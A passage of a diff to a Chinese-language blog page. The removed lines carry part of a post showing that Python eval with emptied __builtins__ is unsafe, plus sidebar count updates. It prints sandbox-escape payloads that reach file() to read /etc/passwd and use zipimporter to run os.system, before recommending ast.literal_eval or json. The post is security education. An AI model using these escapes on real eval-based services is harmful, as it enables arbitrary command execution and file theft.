-...     if c.__name__ == &quot;file&quot;
-... ][0](&quot;/etc/passwd&quot;).read()()
-... &quot;&quot;&quot;
-&gt;&gt;&gt; eval(s1,{&apos;__builtins__&apos;:{}})
-Traceback (most recent call last):
-  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
-  File &quot;&lt;string&gt;&quot;, line 6, in &lt;module&gt;
-IOError: file() constructor not accessible in restricted mode
-</code></pre><p>这个restrictected mode简单理解就是python解释器的沙盒，一些功能被限制了，比如说不能修改系统，不能使用一些系统函数，如file，详情见<a href="http://grail.sourceforge.net/info/manual/restricted.html" target="_blank" rel="external">Restricted Execution Mode</a>，那怎么去绕过呢？这时我们就想到了zipimporter了，假如引入的模块中引用了os模块，我们就可以像如下代码来利用。</p>
-<pre><code>&gt;&gt;&gt; s2=&quot;&quot;&quot;
-... [x for x in ().__class__.__bases__[0].__subclasses__()
-...    if x.__name__ == &quot;zipimporter&quot;][0](
-...      &quot;/home/liaoxinxi/eval_test/configobj-4.4.0-py2.5.egg&quot;).load_module(
-...      &quot;configobj&quot;).os.system(&quot;uname&quot;)
-... &quot;&quot;&quot;
-&gt;&gt;&gt; eval(s2,{&apos;__builtins__&apos;:{}})
-Linux
-0
-</code></pre><p>这就验证了刚才的safe_eval其实是不安全的。</p>
-<h1 id="3，如何正确使用"><a href="#3，如何正确使用" class="headerlink" title="3，如何正确使用"></a>3，如何正确使用</h1><p>（1）使用ast.literal_eval<br>（2）如果仅仅是将字符转为dict，可以使用json格式</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2332,7 +2259,7 @@ Linux
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">17</span>
+                <span class="site-state-item-count">18</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2343,7 +2270,7 @@ Linux
             
             <div class="site-state-item site-state-categories">
               
-                <span class="site-state-item-count">9</span>
+                <span class="site-state-item-count">10</span>
                 <span class="site-state-item-name">分类</span>
               
             </div>
@@ -2354,7 +2281,7 @@ Linux
             
             <div class="site-state-item site-state-tags">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">65</span>
+                <span class="site-state-item-count">70</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
